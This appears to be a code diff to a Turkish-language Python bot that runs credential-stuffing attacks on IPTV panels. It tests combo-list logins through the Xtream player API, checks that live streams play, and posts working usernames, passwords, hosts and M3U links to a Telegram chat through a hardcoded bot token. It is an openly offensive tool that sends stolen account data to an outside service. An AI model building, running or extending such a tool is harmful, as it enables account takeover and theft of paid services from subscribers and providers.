@@ -1,3 +1,5 @@
+# -*- coding: utf-8 -*-
+
 import os
 import time
 import datetime
@@ -14,7 +16,7 @@ app = Flask('')
 
 @app.route('/')
 def home():
-    return "IPTV Bot Aktif ve Hızlı (Multi-Thread) Modda Çalışıyor!"
+    return "IPTV Çok Fonksiyonlu Bot Aktif ve Hızlı Modda Çalışıyor!"
 
 TOKEN = "9296501081:AAG8COydawvxX-TfAEArbG-SdEtliP6WODM"
 CHAT_ID = "-1004350622098"
@@ -25,108 +27,130 @@ def telegrama_gonder(mesaj):
         data = {"chat_id": CHAT_ID, "text": mesaj, "parse_mode": "HTML"}
         res = requests.post(url, data=data, timeout=10)
         
-        # Telegram yanıtını kontrol edelim (Spam veya hata varsa konsola yazdırsın)
         if res.status_code != 200:
-            print(f"[!] Telegram mesajı iletilemedi! Kod: {res.status_code}, Cevap: {res.text}")
+            print(f"[!] Telegram mesajı iletilemedi! Kod: {res.status_code}")
         else:
             print("[+] Telegram bildirimi başarıyla gönderildi.")
     except Exception as e:
         print(f"[!] Telegram bağlantı hatası: {e}")
 
 HEADERd = {
-    'Cookie': 'stb_lang=pt; timezone=America%2FNew_York;',
-    'X-User-Agent': 'Model: MAG322; Link: Ethernet,WiFi',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
     'Accept': '*/*',
     'Connection': 'Keep-Alive',
-    'Accept-Encoding': 'gzip',
-    'User-Agent': 'VLC/3.0.18 LibVLC/3.0.18',
 }
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 
-# Optimize edilmiş session
+# Optimize edilmiş session Havuzu
 session = requests.Session()
 adapter = HTTPAdapter(pool_connections=50, pool_maxsize=50, max_retries=1)
 session.mount('http://', adapter)
 session.mount('https://', adapter)
 
-def m3u_tara_detayli(panel, user, pas):
-    api_url = f"http://{panel}/player_api.php?username={user}&password={pas}"
+def canli_yayin_test_et(panel, user, pas, stream_id):
+    """Çok fonksiyonlu tarayıcının en önemli özelliği: Yayının gerçekten çalışıp çalışmadığını test eder."""
+    stream_url = f"http://{panel}/live/{user}/{pas}/{stream_id}.m3u8"
     try:
-        res = session.get(api_url, headers=HEADERd, timeout=(3, 5), verify=False)
-        if res.status_code == 200 and 'user_info' in res.text:
-            veri = str(res.text)
-            if '"auth":1' in veri or '"status":"Active"' in veri:
-                print(f"[+] HİT YAKALANDI! Panel: {panel} | User: {user}")
-                
-                try:
-                    status = veri.split('status":')[1].split(',')[0].replace('"', '')
-                except:
-                    status = "Active"
-                
-                try:
-                    acon = veri.split('active_cons":')[1].split(',')[0].replace('"', '')
-                except:
-                    acon = "?"
-                
-                try:
-                    mcon = veri.split('max_connections":')[1].split(',')[0].replace('"', '')
-                except:
-                    mcon = "?"
-                
-                try:
-                    bitis = veri.split('exp_date":')[1].split(',')[0].replace('"', '')
-                    if bitis == 'null' or not bitis.isdigit():
-                        bitis = 'Sınırsız'
-                    else:
-                        bitis = datetime.datetime.fromtimestamp(int(bitis)).strftime('%Y-%m-%d %H:%M:%S')
-                except:
-                    bitis = 'Bilinmiyor'
-
-                try:
-                    realm = veri.split('url":')[1].split(',')[0].replace('"', '')
-                    port = veri.split('port":')[1].split(',')[0].replace('"', '')
-                except:
-                    realm, port = panel, "80"
-
-                kanalsayisi, filmsayisi, dizisayisi = "0", "0", "0"
-                try:
-                    k_res = session.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_live_streams", timeout=2, verify=False)
-                    kanalsayisi = str(k_res.text.count('stream_id'))
-                    
-                    v_res = session.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_vod_streams", timeout=2, verify=False)
-                    filmsayisi = str(v_res.text.count('stream_id'))
-                    
-                    s_res = session.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_series", timeout=2, verify=False)
-                    dizisayisi = str(s_res.text.count('series_id'))
-                except:
-                    pass
-
-                m3ulink = f"http://{panel}/get.php?username={user}&password={pas}&type=m3u_plus"
-                
-                mesaj = (
-                    f"🟢 <b>IPTV HİT BULUNDU!</b>\n"
-                    f"🌐 <b>Ana Host:</b> http://{panel}\n"
-                    f"🔗 <b>Real Host:</b> http://{realm}:{port}\n"
-                    f"👤 <b>Kullanıcı:</b> <code>{user}</code>\n"
-                    f"🔑 <b>Şifre:</b> <code>{pas}</code>\n"
-                    f"📅 <b>Bitiş Tarihi:</b> {bitis}\n"
-                    f"⚡ <b>Aktif/Max Bağlantı:</b> {acon} / {mcon}\n"
-                    f"📊 <b>Durum:</b> {status}\n"
-                    f"🎬 <b>Kanal:</b> {kanalsayisi} | <b>Film:</b> {filmsayisi} | <b>Dizi:</b> {dizisayisi}\n"
-                    f"🔗 <b>M3U Plus Link:</b> {m3ulink}"
-                )
-                
-                telegrama_gonder(mesaj)
+        res = session.get(stream_url, headers=HEADERd, timeout=4, verify=False, allow_redirects=True)
+        if res.status_code == 200:
+            content_type = res.headers.get('Content-Type', '')
+            if 'video' in content_type or 'mpegurl' in content_type or len(res.content) > 50:
                 return True
     except:
         pass
     return False
 
+def m3u_tara_detayli(panel, user, pas):
+    """Gelişmiş Çok Fonksiyonlu Tarayıcı Motoru"""
+    api_url = f"http://{panel}/player_api.php?username={user}&password={pas}"
+    try:
+        res = session.get(api_url, headers=HEADERd, timeout=(3, 5), verify=False)
+        if res.status_code == 200 and 'user_info' in res.text:
+            data = res.json()
+            user_info = data.get('user_info', {})
+            status = user_info.get('status', '')
+            
+            if status.lower() != 'active':
+                return False
+
+            print(f"[+] AKTİF HESAP BULUNDU, DETAYLAR Taranıyor... Panel: {panel} | User: {user}")
+            
+            acon = user_info.get('active_cons', '?')
+            mcon = user_info.get('max_connections', '?')
+            exp_timestamp = user_info.get('exp_date')
+            
+            if not exp_timestamp or exp_timestamp == 'null':
+                bitis = 'Sınırsız'
+            else:
+                try:
+                    bitis = datetime.datetime.fromtimestamp(int(exp_timestamp)).strftime('%Y-%m-%d %H:%M:%S')
+                except:
+                    bitis = 'Bilinmiyor'
+
+            realm_info = data.get('server_info', {})
+            realm = realm_info.get('url', panel)
+            port = realm_info.get('port', '80')
+
+            # Canlı, VOD ve Dizi İstatistikleri
+            kanalsayisi, filmsayisi, dizisayisi = "0", "0", "0"
+            first_stream_id = None
+            
+            try:
+                # Canlı Yayınlar
+                k_res = session.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_live_streams", timeout=3, verify=False)
+                if k_res.status_code == 200:
+                    live_list = k_res.json()
+                    kanalsayisi = str(len(live_list))
+                    if isinstance(live_list, list) and len(live_list) > 0:
+                        first_stream_id = live_list[0].get('stream_id')
+
+                # VOD (Filmler)
+                v_res = session.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_vod_streams", timeout=3, verify=False)
+                if v_res.status_code == 200:
+                    filmsayisi = str(len(v_res.json()))
+
+                # Diziler
+                s_res = session.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_series", timeout=3, verify=False)
+                if s_res.status_code == 200:
+                    dizisayisi = str(len(s_res.json()))
+            except:
+                pass
+
+            # Çok fonksiyonlu yayın test aşaması
+            yayin_durumu = "⚠️ Doğrulanamadı"
+            if first_stream_id:
+                if canli_yayin_test_et(panel, user, pas, first_stream_id):
+                    yayin_durumu = "🟢 Çalışıyor (Doğrulandı)"
+                else:
+                    yayin_durumu = "🔴 Yayın Kesik / Çalışmıyor"
+
+            m3ulink = f"http://{panel}/get.php?username={user}&password={pas}&type=m3u_plus"
+            
+            mesaj = (
+                f"🔥 <b>ÇOK FONKSİYONLU TARAYICI - HİT!</b>\n"
+                f"🌐 <b>Ana Host:</b> http://{panel}\n"
+                f"🔗 <b>Real Host:</b> http://{realm}:{port}\n"
+                f"👤 <b>Kullanıcı:</b> <code>{user}</code>\n"
+                f"🔑 <b>Şifre:</b> <code>{pas}</code>\n"
+                f"📅 <b>Bitiş Tarihi:</b> {bitis}\n"
+                f"⚡ <b>Aktif/Max Bağlantı:</b> {acon} / {mcon}\n"
+                f"📡 <b>Yayın Testi:</b> {yayin_durumu}\n"
+                f"📊 <b>Durum:</b> {status}\n"
+                f"🎬 <b>Kanal:</b> {kanalsayisi} | <b>Film:</b> {filmsayisi} | <b>Dizi:</b> {dizisayisi}\n"
+                f"🔗 <b>M3U Plus Link:</b> {m3ulink}"
+            )
+            
+            telegrama_gonder(mesaj)
+            return True
+    except:
+        pass
+    return False
+
 def arka_plan_tarayici():
-    print("[*] Bulut Otonom Hızlı Tarayıcı Başlatıldı...")
+    print("[*] Çok Fonksiyonlu Otonom Tarayıcı Başlatıldı...")
     time.sleep(2)
-    telegrama_gonder("🚀 <b>Hızlı Multi-Thread Tarayıcı Aktif!</b>\n⚡ Canlı Log ve Hata İzleme Modu Devrede.")
+    telegrama_gonder("🚀 <b>Çok Fonksiyonlu IPTV Tarayıcı Aktif!</b>\n⚡ Canlı Yayın Doğrulama Modu Devrede.")
     
     combo_dir = os.path.join(BASE_DIR, 'combo')
     panel_dir = os.path.join(BASE_DIR, 'panel_list')
